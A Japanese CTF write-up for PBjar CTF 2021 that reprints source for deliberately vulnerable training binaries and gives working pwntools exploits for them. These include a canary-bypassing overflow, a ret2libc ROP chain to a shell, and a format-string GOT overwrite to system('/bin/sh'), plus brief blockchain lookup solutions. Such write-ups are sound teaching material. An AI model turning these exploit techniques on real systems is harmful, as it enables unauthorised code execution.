---
title: "PBjar CTF 2021 Writeup"
date: 2021-09-20T22:00:00+09:00
lastmod: 2021-09-20T22:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">

{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fpbjar_ctf_2021%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://ctf.pbjar.net/challenges](https://ctf.pbjar.net/challenges)
<br /><br />
3207点を獲得し、88位でした。

<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_score.png" alt="pbjar_CTF_2021_score.png">

<br>
今回は、チャレンジ文のスクリーンショットを使います。<br>
（イベント中に撮ったので、solvesとpointsの数はイベント中のものです。）



<br /><br />
<br /><br />
## [Pwn]: Walkthrough
- - -
<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_pwn1.png" alt="pbjar_CTF_2021_pwn1.png">


ソースコードも添付されています。

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>

void divide(){
        puts("---------------------------------------------------------------------------------------\n");
}

void ascii(){
	puts("   ▄███████▄  ▄█     █▄  ███▄▄▄▄   ");
	puts("  ███    ███ ███     ███ ███▀▀▀██▄ ");
	puts("  ███    ███ ███     ███ ███   ███ ");
	puts("  ███    ███ ███     ███ ███   ███ ");
	puts("▀█████████▀  ███     ███ ███   ███ ");
	puts("  ███        ███     ███ ███   ███ ");
	puts("  ███        ███ ▄█▄ ███ ███   ███ ");
	puts(" ▄████▀       ▀███▀███▀   ▀█   █▀  \n");
}

void intro(){
	puts("INTRO:\n");

	puts("Welcome to my pwn walkthrough program.");
	puts("I hope to make pwn a little more approachable, so this problem will guide you in basic rop and format string.\n");
}

void info(){
	puts("INFO:\n");

	puts("To start out, to run this program, you will need to use some sort of linux distribution.");
	puts("If you are on windows, you can use wsl or vmware, I personally use vmware.");
	puts("To use vmware, you need to search for some linux distribution image online and follow instructions on how to set up the vm.\n");

	puts("Once you have that set up, you will want to use a python script with the pwntools library to create an exploit.");
	puts("You can read the documentation at https://docs.pwntools.com/en/stable/about.html.\n");

	puts("You may also want to use a command called checksec to see what conditions the elf binary has.\n");

	puts("Also, though you won't necessarily need it for this problem, you will likely use gdb a lot.");
	puts("Using an extension to visualize stack, registers, and memory data can be very helpful.");
	puts("I reccomend gdb peda, which you can read about at https://github.com/longld/peda.\n");

	puts("Similarly, though you won't need it for this program, a program called Ghidra is very important in both pwn and rev.");
	puts("It disassembles elf binaries so you can read the source code even when it is not given.");
	puts("You can download it at https://ghidra-sre.org.\n");

	puts("Now to get started!\n");
}

void dashdiv(){
	puts("- - - - - - - - - - - - - - - - - - - - - - -");
}

void stkstrt(){
	dashdiv();
	puts("- - - - - - - - - - Stack - - - - - - - - - -");
	dashdiv();
}

void stk(long *buf, int idx, char *mes){
	printf("%04d| 0x%llx -> %016llx %s\n", 8 * idx, &buf[idx], buf[idx], mes);
}

void stkend(){
	puts("...");
	dashdiv();
	puts("- - - - - - - - - End stack - - - - - - - - -");
	dashdiv();
	puts("");
}

void rop(){
	char buf[0x40];
	
	puts("ROP:\n");

	puts("\"Roppity hoppity, this is now my property.\"\n");

	puts("In rop, you want to take control of the program by overwriting the return address on the stack.\n");

	printf("First, here is the canary value (what is canary explained later): 0x%llx\n", ((long *)buf)[0x9]);
	puts("Now, input something into the char buf array, and I will show you what that looks like on the stack.");

	gets(buf); //here is the overflow vuln, rest is info
	puts("");

	stkstrt();
	
	stk(buf, 0x0, "(buf strt)");
	for(int i = 0x1; i < 0x7; i++) stk(buf, i, "");
	stk(buf, 0x7, "(buf end)");
	
	stk(buf, 0x8, "");
	stk(buf, 0x9, "(canary)");
	stk(buf, 0xa, "(rop func base ptr)");
	stk(buf, 0xb, "(rop func return ptr)");
	stk(buf, 0xc, "(main func base ptr)");
	stk(buf, 0xd, "(main func return ptr)");

	stk(buf, 0xe, "(stack continues below with stuff we don't care abt)");
	for(int i = 0xf; i < 0x18; i++) stk(buf, i, "");

	stkend();

	puts("As you can see, the stack contains many bits of information in a specific layout, so I will attempt to explain it.\n");

	puts("First off, local variables for the currently executing function are held at the top of the stack");
	puts("This is why you see the char buf array at the top of the stack.");
	puts("Variables that aren't initialized also contain the values held in the stack previously.");
	puts("This is why the buf array may contain some random values after the input string.");
	puts("However, the end of the inputted string is signified by a null byte placed by the gets function.\n");

	puts("After the buffer array, you can see something called a canary.");
	puts("This is a security protection against stack overflows, but it is only effective assuming the user doesn't know the canary value.");
	puts("It is a random value that is tested if it changed when a function returns.");
	puts("Not all binaries have a canary, you can find out using the checksec command mentioned in the info section.");
	puts("Probably most rop problems in ctf pwn do not use a canary, but I put one in here for educational purposes.\n");

	puts("Next, the stack contains the base pointer for the rop function.");
	puts("This signifies where the stack frame will be when the current function returns.");
	puts("This is necessary because the stack needs to point back to the local variables and return address of the function that called it.\n");

	puts("Now, we finally have the return address for the rop function.");
	puts("The return address points to where the code should continue running from after the function finishes.");
	puts("In this case, it points to code in the main function right after where the rop function is called.");
	puts("This is the value on the stack you want to overwrite to change the program to run whatever code you want to call next.\n");

	puts("Lastly, you can see the base pointer and return address of the main function as well.");
       	puts("Once the rop function returns back to main, these values will be back at the top of the stack.");
	puts("After that the stack just has more local environment data that goes on for a while.\n");

	dashdiv();

	puts("\nYou now hopefully realize the general idea on how to rop to control the next function called.");
	puts("You need to input some amount of characters that reach up to the return address and correspond to the address you want to call.");
       	puts("You also need to make sure to input characters that can correspond to the same value as the canary so it does not change value.\n");

	puts("However, you may be wondering how you are able to read past the buf array memory.");
 	puts("Well, the function gets is quite insecure, so it will actually read as long of a string as you input, even if it is longer than the memory region it is being inputted into.");
	puts("This means if you just put a long enough string you can write past the buffer array and onto other stack values.");
	puts("You can test this by typing a bunch of a's to overwrite the canary and see a message pop up stating there has been stack smashing detected.\n");

	dashdiv();

	puts("\nWe will now use the pwntools python library to create the carefully crafted string perform the rop.");
	puts("First off, the binary does not used randomized addresses, meaning we can find the address ahead of time.");
	puts("We want to call the fmtstr function, and you can find the address of that function with this python code:");
	puts(">>> e = ELF('./walkthrough')");
	puts(">>> print(hex(e.sym['fmtstr'])\n");

	puts("Now, to write an address as a string, you need to understand how memory holds numbers.");
	puts("Most memory stores numbers in something called reverse endian order, where the lowest byte goes at the earliest address.");
	puts("That means for example, the number 0x69420 would look like the string '\\x20\\x94\\x06'");
	puts("Luckily, pwntools also has a function to automatically convert a hex value into a reverse endian string, like this:");
	puts(">>> print(p64(0x69420))\n");

	puts("Finally, to communicate interact with a program, you can use these code snippets:");
	puts(">>> p = process('./walkthrough') #use this one to test locally");	
	puts(">>> p = remote('netcat.address', [port num]) #use this one to connect over netcat");
	puts(">>> p.sendline('String to send')");
	puts(">>> output_of_program = p.recv(256)");
	puts(">>> output_line = p.recvline()");
	puts(">>> output_until = p.recvuntil('input: ')");
	puts(">>> p.interactive() #allow user to input to program directly\n");

	dashdiv();

	puts("\nNow, to finally put this information all together, you will need to write something like this:");
	puts(">>> from pwn import *");
	puts(">>> e = ELF('./walkthrough')");
	puts(">>> p = process(e.path)");
	puts(">>> p.recvuntil('later): ')");
	puts(">>> canary = int(p.recvline(keepends = False), 16) #keepends = False drop the newline character");
	puts(">>> p.sendline(b'a' * x + p64(canary) + b'a' * y + p64(e.sym['fmtstr'] + 1)) #figure out what x and y values should be");
	puts("In this particular problem, notice you need the '+ 1' added fmtstr adr, which you won't normally need.");
	puts("This is due to future scanf calls needing a valid rbp value and this magically fixes it.\n");

	puts("Also, you may find the following commands useful, though not necessary for an exploit:");
	puts(">>> log.info('This func logs info to your terminal, for example the canary: ' + hex(canary))");
	puts(">>> gdb.attach(p) #open a terminal with gdb containing the current state of your program\n");

	puts("Lastly, Pwntools also has a built in tool for calling complicated chains of multiple functions with parameters.");
	puts("You can read about it at https://docs.pwntools.com/en/stable/rop/rop.html, but it is not very useful for this problem.\n");

	puts("I hope you figured it out!\n");
}

void fmtstr(){
	long num[0x8];
	char buf[0x20];
	num[0x0] = 0x31415926535;
	num[0x1] = 0x696969696969;
	num[0x2] = 0x420420420420;
	num[0x3] = 0x0;
	num[0x4] = 0x0;
	num[0x5] = 0xdeadbeef;
	num[0x6] = 0x133713371337;
	num[0x7] = 0x123456789abc;

	divide();

	puts("FORMAT STRING:\n");

	puts("\"A function's greatest strength may also be its greatest weakness.\" - Sun Tzu\n");

	puts("Nice job with the rop, looks like you made it here!\n");

	puts("You are going to have to guess a random number correctly.");
	puts("However, I will let you input a string into a buf array first. (using a more secure method without overflow)");
       	puts("I will then pass that string in printf giving you a format string vulnrability that should allow you to leak the number.");
	puts("The number will be on the num array located on the stack.");
	puts("Before I set that number, I will show you the stack.\n");

	stkstrt();

	stk(num, 0x0, "(num start)");
	for(int i = 0x1; i < 0x3; i++) stk(num, i, "");
	stk(num, 0x3, "(where guess value will be)");
	stk(num, 0x4, "(where random value will be)");
	for(int i = 0x5; i < 0x7; i++) stk(num, i, "");
	stk(num, 0x7, "(num end)");

	stk(num, 0x8, "(buf start)");
	for(int i = 0x9; i < 0xb; i++) stk(num, i, "");
	stk(num, 0xb, "(buf end)");

	stk(num, 0xc, "");
	stk(num, 0xd, "(canary)");
	stk(num, 0xe, "(fmtstr base ptr, messed up from rop)");
	stk(num, 0xf, "(fmtstr return adr, useless since exit func called at end of this function)");
	stk(num, 0x10, "(stuff below is useless now)");
	for(int i = 0x11; i < 0x18; i++) stk(num, i, "");

	stkend();

	puts("I will now set the random number.\n");

	num[0x4] = rand();

	dashdiv();

	puts("\nNow, you may be wondering what a format string vulnerability is.");
	puts("Well, you may be familiar with the function printf, which uses a string with formatters to create a specific output.");
	puts("See https://en.wikipedia.org/wiki/Printf_format_string for more info.\n");

	puts("When user input is passed in the first parameter where constant formatters are supposed to go this is called a format string vulnerability.");
	puts("Ie the code 'printf(\"\%s\", buf)' is correct, but 'printf(buf)' is vulnerable.");
	puts("With a carefully crafted input, a user can leak values on the stack and even write to addresses on the stack.");
	puts("You will only need to leak a value for this problem though.\n");

	puts("To see what I mean, I encourage you to experiment with the input '\%[number]$llx', where you decide the number.");
	puts("I think you should be able to figure out the rest from here. :pray:\n");

	dashdiv();

	puts("\nInput the string that will be passed into printf.");
	scanf("%31s", buf);

	puts("\nThe printf result is:");
	printf(buf); //here is format string vuln, rest is info
	puts("\n");

	dashdiv();

	puts("\nNow input the value you're guessing.");
	scanf("%lld", &num[0x3]);

	puts("\nNow testing if random and guess values are equal.\n");

	dashdiv();
	puts("");

	if(num[0x3] == num[0x4]){
		puts("You beat rng!\n");

		FILE *f = fopen("flag.txt","r");
		if(f == NULL){
			puts("If you are running locally, you need to create a file called 'flag.txt' in the running progam's directory.");
			puts("Otherwise, something is wrong. Please contact the author on discord.");
			exit(1);
		}

		fgets(buf, 0x20, f);

		puts("After all that program manipulation, here's the flag:");
		puts(buf);
	}else{
		puts("You failed baka.");
	}

	exit(0);
}

void outro(){
	puts("OUTRO:\n");

	puts("Whoops, looks like you didn't rop anywhere.");
	puts("Make sure to overflow all the way to the return address to control what function is called.");
}

int main(){
        setbuf(stdout, 0x0);
        setbuf(stderr, 0x0);
	srand(time(0));

	ascii();

	divide();

	intro();

	divide();

	info();

	divide();
	
	rop();

	divide();

	outro();

        return 0;
}
```

<br />
### Solution
最初の Canary 回避のところまではほぼ説明文内のサンプル通りです。

その次は Format string bug（書式文字列攻撃）で、スタックにある rand() の値を読み取ってそれを入力するとフラグが得られるというものです。

こんな感じのコードになりました。14番目で rand() は取れます。

{{< highlight python "linenos=table,hl_lines=15" >}}
#!/usr/bin/env python
# -*- coding:utf-8 -*-
from pwn import *

for i in range(10,15):
    print(i)
    e = ELF('./walkthrough', checksec=False)
    s = remote("147.182.172.217", 42001)
    # s = process(e.path)
    s.recvuntil(b'later): ')
    canary = int(s.recvline(keepends = False), 16) #keepends = False drop the newline character
    s.sendline(b'a' * 0x48 + p64(canary) + b'a' * 8 + p64(e.sym['fmtstr'] + 1)) #figure out what x and y values should be

    s.recvuntil(b'Input the string that will be passed into printf.\n')
    s.sendline(b'%' +bytes(str(i).encode('utf8'))+ b'$llx')
    s.recvuntil(b'The printf result is:\n')
    msg = s.recvline()
    s.recvuntil(b"Now input the value you're guessing.")

    try:
        s.sendline(str(int(msg[:-1], 16)))
    except:
        s.sendline(b"1")
        pass

    s.recvuntil(b"You")
    msg = s.recvline()
    print(b"You" + msg)
    if b"beat" in msg:
        print(s.recvall())
    s.close()
    sleep(1)
{{< / highlight >}}

<br />
python3になってからカウンタ値を文字列と連結するのがめんどくさいんですが（ハイライト部分）、もっといいやり方があるんだろうな、きっと。。。（勉強しておきます）

<br />

Flag: `flag{4nd_s0_th3_3xpl01ts_b3g1n}`



<br /><br />
<br /><br />
## [Pwn]: Ret2Libc
- - -
<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_pwn2.png" alt="pbjar_CTF_2021_pwn2.png">

ソースコードも添付されています。

```C
#include <stdio.h>

void divide(){
	puts("---------------------------------------------------------------------------------------\n");
}

void asciiart(){
	puts("__________        __  ________ .____    ._____. ");
	puts("\\______   \\ _____/  |_\\_____  \\|    |   |__\\_ |_");
	puts(" |       _// __ \\   __\\/  ____/|    |   |  || __ \\_/ ___\\ ");
	puts(" |    |   \\  ___/|  | /       \\|    |___|  || \\_\\ \\  \\___ ");
	puts(" |____|_  /\\___  >__| \\_______ \\_______ \\__||___  /\\___  >");
	puts("        \\/     \\/             \\/       \\/       \\/     \\/ \n");

}

void intro(){
	puts("INTRO: \n");

	puts("This is a classic ret2libc task, and understanding it is essential to solving all pwn problems this contest.\n");

	puts("Essentially, a buffer overflow is more powerful than you might have realized!\n");

	puts("With just a single buffer overflow, you can get a shell on a remote server, even without a win function! :eyes:\n");
}

void setup(){
	puts("SETUP: \n");

	puts("To try this exploit on your computer, you need to use a tool called patchelf to link the binary with the correct libc and dynamic linker version provided.\n");

	puts("To get patchelf, type 'sudo apt-get install patchelf' in your terminal.\n");

	puts("To use it, type 'patchelf --set-interpreter ./ld-ret2libc.so --add-needed ./libc-ret2libc.so ./ret2libc'.\n");

	puts("In general, you will need to do this for every problem where your exploit uses the libc.\n");
}

void explain_pltgot(){
	puts("ABOUT PLT AND GOT: \n");

	puts("Hopefully, you remember how to use an overflow to rop to a win function.\n");

	puts("Well that idea can be expanded on further, by calling functions in both the binary and libc.\n");

	puts("When you use library calls, have you ever wondered how that works? :think:\n");

	puts("The binary will internally have some links to the functions in libc, that it uses to call upon.\n");

	puts("These functions are known as plt functions, as they are located in the .plt section of the binary.\n");

	puts("For example, in this binary, the 'puts' and 'gets' function will be located in the plt.\n");

	puts("However, the actual libc addresses the plt functions use to call are located in a seperated section, called the .got section.\n");

	puts("You can find these address offsets for a binary in pwntools using the ELF module, or you can also use objdump/readelf.\n");
}

void explain_rop(){
	puts("HOW TO USE PLT AND GOT TO CALL SYSTEM: \n");

	puts("Okay, so how does this help?\n");

	puts("Well, since system is in libc that the program uses, what is stopping us from just calling that (why do you think it's called ret2libc)? :eyes:\n");

	puts("But wait, libc addresses are randomized, how do we know the libc base address?\n");

	puts("If only there were a plt function you could call with rop that could print a libc address from the got table...\n");

	puts("Also, even with one overflow, what if could you call a function to get back to another overflow again? :think:\n");

	puts("One more thing, to load addresses to functions in x86_64 binaries, you need to use something called gadgets.\n");

	puts("Functions with a single variable are loaded with the 'pop rdi ; ret' gadget, which then puts the following address on the stack into the rdi register.\n");

	puts("You rop to them just like anything else, by putting their address after the overflow.\n");

	puts("You can find their addresses with the tool ROPgadget.\n");
}

void resources(){
	puts("RESOURCES: \n");

	puts("Still confused?\n");

	puts("Luckily, since this is likely your first ret2libc, I'll give you some links to make it easy. :sunglasses:\n");

	puts("Hopefully these will help you understand:\n");

	puts("Article tutorial: https://pwning.tech/2019/07/29/ret2libc-pwntools/");
	puts("Similar problem writeup (the code will probably help a lot): https://github.com/datajerk/ctf-write-ups/blob/master/redpwnctf2020/the-library/README.md");
	puts("Elf module pwntools: https://docs.pwntools.com/en/2.2.0/elf.html");
	puts("ROPgadget download: https://github.com/JonathanSalwan/ROPgadget"); 
	puts("Also in general, make sure you use 'peda' extenion for gdb: https://github.com/longld/peda");
	puts("And this may make life much easier: https://docs.pwntools.com/en/stable/rop/rop.html\n");

	puts("And if that's not enough, remember this is a classic problem, so there should be tons of similar writeups you can google!\n");
}

void learn(){
	char buf[32];

	puts("WANT TO LEARN: \n");

	puts("Before we start, would you like to learn about ret2libc?[y/N]");

	gets(buf);

	puts("");

	if(buf[0] == 'y' || buf[0] == 'Y'){
		divide();

		explain_pltgot();

		divide();

		explain_rop();

		divide();

		resources();
	}else{
		puts("I see, you must be a natural!\n");
	}
}

void farewell(){
	puts("FAREWELL: \n");

	puts("Well did it work? Wait, did it even start?\n");

	puts("(If you think it should work and it didn't, try ropping to 'ret' gadget [pop_rdi + 1] first to align stack.)\n");

	puts("Adios!\n");
}

int main(){
	setbuf(stdout, 0);
	setbuf(stderr, 0);

	asciiart();

	divide();

	intro();

	divide();

	setup();

	divide();

	learn();

	divide();

	farewell();

	return 0;
}
```

<br />
### Solution
これはもう、今まで何度かやってきたのと同じです。

```Python
#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *
context(os='linux', arch='amd64')
context.log_level = 'critical'

elf = ELF('./ret2libc')
context.binary = elf

s = remote('143.198.127.103', 42001)

rop = ROP(elf)
rop.puts(elf.got.puts)
rop.main()
print(rop.dump())
s.sendlineafter(b"ret2libc?[y/N]\n", b'A'*40 + rop.chain())
s.recvuntil(b'natural!\n\n')
# puts = u64(s.recv(6) + b'\x00\x00')
puts = u64(s.recvline().rstrip().ljust(8, b"\x00"))
print('puts: %x' % puts)
libc = ELF('./libc-2.31.so', checksec=False)
libc.address = puts - libc.symbols.puts

rop = ROP(libc)
rop.execv(next(libc.search(b'/bin/sh')), 0)
print(rop.dump())
s.sendlineafter(b"ret2libc?[y/N]\n", b'A'*40 + rop.chain())
s.recvuntil(b'natural!\n\n')
s.interactive()	
```

<br />

Flag: `flag{th3_wh0l3_us3l3r4nd_1s_my_pl4ygr0und}`



<br /><br />
<br /><br />
## [Pwn]: FmtStr
- - -
<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_pwn3.png" alt="pbjar_CTF_2021_pwn3.png">

ソースコードも添付されています。

```C
#include <stdio.h>
#include <stdlib.h>

void divide(){
        puts("---------------------------------------------------------------------------------------\n");
}

void asciiart(){
	puts("/$$$$$$$$              /$$      /$$$$$$   /$$              ");
	puts("| $$_____/             | $$     /$$__  $$ | $$              ");
	puts("| $$    /$$$$$$/$$$$  /$$$$$$  | $$  \\__//$$$$$$    /$$$$$$ ");
	puts("| $$$$$| $$_  $$_  $$|_  $$_/  |  $$$$$$|_  $$_/   /$$__  $$");
	puts("| $$__/| $$ \\ $$ \\ $$  | $$     \\____  $$ | $$    | $$  \\__/");
	puts("| $$   | $$ | $$ | $$  | $$ /$$ /$$  \\ $$ | $$ /$$| $$      ");
	puts("| $$   | $$ | $$ | $$  |  $$$$/|  $$$$$$/ |  $$$$/| $$      ");
	puts("|__/   |__/ |__/ |__/   \\___/   \\______/   \\___/  |__/\n");
}

void intro(){
	puts("INTRO:\n");

	puts("Have you used printf in C?\n");

	puts("When you use it, it is important to format data to output correctly, especially when ouputting user input.\n");

	puts("When done incorrectly, printf becomes a powerful tool to the user. :sunglasses:\n");
}

void explain_fmtstr(){
	puts("EXPLAIN FMTSTR:\n");

	puts("First off, if you don't already, you need to understand formatting for printf.\n");

	puts("When using printf, the code should look something like:");
	puts("printf(\"[constant string with formatters]\", [input to format 1], [input to format 2], etc...);\n");

	puts("There are many formatters, for different types of input.\n");

	puts("Here are some:\n");

	puts("\%s: string");
	puts("\%c: character");
	puts("\%d: signed integer");
	puts("\%x: hex integer");
	puts("\%p: address");
	puts("\%n: print nothing but write number of previously printed (not number of input) characters to input address (why does this even exist?)\n");

	puts("An example of how this would be used is the following:");
	puts("printf(\"Best girl is \%s \%d, duh!\\n\", \"Amy\", 2);\n");

	puts("This would output:");
	printf("Best girl is %s %d, duh!\n", "Amy", 2);

	puts("");

	puts("However, the formatters can have much more specifications.\n");

	puts("A more complete template to formatters would be:");
	puts("\%[parameter][flags][width][.precision][length]type\n");

	puts("The most important things are:\n");	

	puts("Paramater - by using 'n$' between the '\%' and type, you can choose which input position the format string takes the value from.");
	puts("Width - sets the minimum amount of characters to be printed, will print spaces unless character specified before width");
	puts("Length - Can add modifiers before type such as to change the size of the input, such as 'hh' to take a byte, or 'll' to take a long long\n");

	puts("Here's one more example with the new format options:");
	puts("printf(\"\%3$s, please go on a date with me in \%6$020lld days!\\n\", \"Amy Wan\", \"Amy Tu\", \"Yusa Ko\", 3, 21, 694203141592653);\n");

	puts("This would output:");
	printf("%3$s, please go on a date with me in %6$020lld days!\n", "Amy Wan", "Amy Tu", "Yusa Ko", 3, 21, 694203141592653);

	puts("");

	puts("You can find more details on wikipedia.\n");
}

void explain_exploit(){
	puts("EXPLAIN EXPLOIT:\n");

	puts("All that format stuff is great and all, but how would it possibly be used in an exploit?\n");

	puts("Well, if the programmer formats the output correctly, it can't. :weary:\n");

	puts("However, what if you, as the user, were able to control the first parameter that uses the formatters? :think:\n");

	puts("A common beginner mistake is to write code like 'printf(buf);', where buf is a string the user can write to.\n");

	puts("When this is the case, whatever formatters you input to buf will still be used! :eyes:\n");

	puts("You may be thinking, 'what does the formatters do if there aren't any other parameters to use tho?'\n");

	puts("Well the magical thing is, printf's inputs are on the stack, so you are able to print and modify stack addresses as if they are inputs!\n");

	puts("In the exploit, try typing '\%p \%p \%p \%p \%p \%p \%p', and you will see that you are in fact leaking addresses.\n");

	puts("Even more lucky for you, libc addresses seem to always find their way onto the stack!\n");

	puts("In gdb peda, an easy way to view the stack is just the command 'stack [number addreses to output]'.\n");

	puts("Also remember that weird '\%n' formatter?\n");

	puts("Well, because it can write to an address on the stack, if you are able to place an address on the stack you want to write to, you can than write to it!\n");

	puts("Luckily, it is **almost always** the case the input string is located on the stack, so you can just write addresses on the input string.\n");

	puts("What if you overwrote a got address causing a function to call something other than the intended libc address it's supposed too? :eyes:\n");

	puts("And a tip, to print some number of chars that are used as the '\%n' write value, just type '\%[number chars]c'\n");

	puts("Another tip, rather than writing all characters at once (where you'd have to print a ton of characters), split the write into bytes or shorts with the size length modifier.\n");

	puts("Overall, your goal should be:\n");

	puts("1) leak libc address from stack.");
	puts("2) Overwrite a function got with system so you can put '/bin/sh' into it.");
	puts("3) Put '/bin/sh' into that function\n");

	puts("Don't forget the input position modifier for formatters, it makes it easier to get the stack offsets you want.\n");

	puts("Btw, I heard pwntools can make writes with printf way easier than by hand (specifically the fmtstr_payload function).\n");

	puts("To use it, make sure you set the pwntools context arch correctly.\n");
}

void resources(){
	puts("RESOURCES:\n");

	puts("I know, I'm too nice, giving you even more help.\n");

	puts("Here are a few maybe helpful links:\n");

	puts("Video tutorial (and great channel): https://www.youtube.com/watch?v=t1LH9D5cuK4");
	puts("Wikipedia printf formatters: https://en.wikipedia.org/wiki/Printf_format_string");
	puts("Pwntools fmtstr: https://docs.pwntools.com/en/stable/fmtstr.html\n");
}

void learn(){
	char buf[32];

	puts("WANT TO LEARN:\n");

	puts("Before we start, would you like to learn about format string exploits?[y/N] (also, I fixed the overflow here :clown:)");

	fgets(buf, 32, stdin);

	puts("");

	if(buf[0] == 'y' || buf[0] == 'Y'){
		divide();

		explain_fmtstr();

		divide();

		explain_exploit();

		divide();

		resources();
	}else{
		puts("I see, you must be a natural!\n");
	}
}

void vuln(){
	char buf[128];

	puts("EXPLOIT:\n");

	puts("Here we go, I'll be nice and read three inputs, and all three will be outputted with printf as its first paramter.\n");

	puts("However, no overflows, I won't take more than 128 characters at a time. :pensive:\n");

	puts("Give me your first input:");

	fgets(buf, sizeof(buf), stdin);

	printf(buf);

	puts("");

	puts("Nice, now give me your second input:");

	fgets(buf, sizeof(buf), stdin);	

	printf(buf);

	puts("");

	puts("Alright, one last input:");

	fgets(buf, sizeof(buf), stdin);	

	printf(buf);

	puts("");
}

void farewell(){
	puts("FAREWELL:\n");

	puts("Hopefully something worked right!\n");

	puts("Adios!\n");
}

int main(){
	setbuf(stdout, 0x0);
        setbuf(stderr, 0x0);

	asciiart();

	divide();

	intro();
	
	divide();

	learn();

	divide();

	vuln();

	divide();

	farewell();

	return 0;
}
```


<br />
### Solution
FSBが3回行えるようになっています。それぞれでやることは以下の通りです。

1) スタックから libc アドレスのリーク
2) GOT overwrite で printf を systemに。
3) 引数 '/bin/sh' をセット。

<br />

gdb を使って最初の fgets() のところでスタックの中身を確認し、`<puts+378>` があるのを見つけたのでそれを使いました。

<pre>
gef➤  x/16gx $rsp
0x7fffffffe160:	0x0000000000405060	0x00007ffff7fc54a0
0x7fffffffe170:	0x0000000000000000	0x00007ffff7e86709
0x7fffffffe180:	0x000000000000000a	0x00007ffff7e86b63
0x7fffffffe190:	0x0000000000000058	0x00007ffff7fc46a0
0x7fffffffe1a0:	0x0000000000402008	0x00007ffff7e7b76a
0x7fffffffe1b0:	0x0000000000000000	0x00007fffffffe1e0
0x7fffffffe1c0:	0x0000000000401070	0x0000000000000000
0x7fffffffe1d0:	0x0000000000000000	0x0000000000401162

gef➤  x/4gx 0x00007ffff7e7b76a
0x7ffff7e7b76a &lt;puts+378>:	0xffff77850ffff883	0x1f0ffffffef7e9ff
0x7ffff7e7b77a &lt;puts+394>:	0x01b9000000000084	0x0f41f0d089000000
</pre>


これが FSBを使って 15番目（`%15$016lx`）で取れるのは、何度かトライ＆エラーで見つけました。

<br />

{{< highlight python "linenos=table,hl_lines=5" >}}
#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *
context(arch='amd64', os='linux')

s = remote('143.198.127.103', 42002)
# s = process('./fmtstr')

elf = ELF('./fmtstr', checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)

# Before we start, would you like to learn about format string exploits?[y/N] (also, I fixed the overflow here :clown:)
# N
s.sendlineafter(b':clown:)\n', b'N')

s.sendlineafter(b'Give me your first input:\n', b"%15$016lx")
r = s.recvline()

puts_addr = int(r[:-1], 16) - 378
libc_base = puts_addr - libc.symbols['puts']

print(hex(libc_base))
system_addr = libc_base + libc.symbols['system']

# AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
# AAAA00b682a1.00000000.00b682e5.ec6378e0.00000000.41414141.3830252e.252e7838.78383025.30252e78.2e783830.3830252e.252e7838
# ==> 6
payload = fmtstr_payload(6, {elf.got.printf: system_addr})

s.sendlineafter(b'Nice, now give me your second input:\n', payload);

s.sendlineafter(b'Alright, one last input:\n', b'/bin/sh');
s.interactive()
{{< / highlight >}}

<br />

Flag: `flag{w1th_just_s0m3_str1ngz_1_b3c4m3_4_g0d_4t_r3d1r3ct10n}`


<br /><br />
ちなみに、説明文の中にも以下の注意書きが出てくるんですが、

`To use it, make sure you set the pwntools context arch correctly.`

<br />

最初に自分が書いたコードで arch の設定（ハイライト部分）をしていなかったばっかりに、以下のようなエラーが出て相当悩みました。。

<pre>
    raise ValueError("pack(): number does not fit within word_size [%i, %r, %r]" % (0, number, limit))
ValueError: pack(): number does not fit within word_size [0, 139917139504720, 4294967296]
</pre>



<br /><br />
<br /><br />
## [Misc]: discord plz (1 point)
- - -
<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_misc1.png" alt="pbjar_CTF_2021_misc1.png">

<br />
### Solution
Discordに入れば見つかるやつ。

<br />

Flag: `flag{thamks_for_joining_the_disc}`



<br /><br />
<br /><br />
## [Misc]: miner
- - -
<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_misc2.png" alt="pbjar_CTF_2021_misc2.png">

<br />
### Solution
`11834380` `Ethereum` でググったら以下が見つかりました。<br />
[https://cn.etherscan.com/block/11834380](https://cn.etherscan.com/block/11834380)

<br />

Flag: `flag{0xd224ca0c819e8e97ba0136b3b95ceff503b79f53}`


<br /><br />
<br /><br />
## [Misc]: readFlag1
- - -
<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_misc3.png" alt="pbjar_CTF_2021_misc3.png">

<br />
### Solution
ropsten の中でいろいろクリックしてたら見つかりました。（以下）<br />
[https://ropsten.etherscan.io/address/0xf0674cd7d1c0c616063a786e7d1434340e09badd#code](https://ropsten.etherscan.io/address/0xf0674cd7d1c0c616063a786e7d1434340e09badd#code)

<br />

Flag: `flag{etherscan_S0urc3_c0de}`



<br /><br />
<br /><br />
## [Misc]: readFlag2
- - -
<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_misc4.png" alt="pbjar_CTF_2021_misc4.png">

<br />
### Solution
チャレンジ文の中で `Previous one` と言われている contract は、0xa50cc4d707d8874e2494148ec2bab6138977838783ea200a45a8269384faaed4 です。

ropsten の中でいろいろクリックしてたら見つかりました。（以下）<br />
[https://ropsten.etherscan.io/tx/0xa50cc4d707d8874e2494148ec2bab6138977838783ea200a45a8269384faaed4](https://ropsten.etherscan.io/tx/0xa50cc4d707d8874e2494148ec2bab6138977838783ea200a45a8269384faaed4)

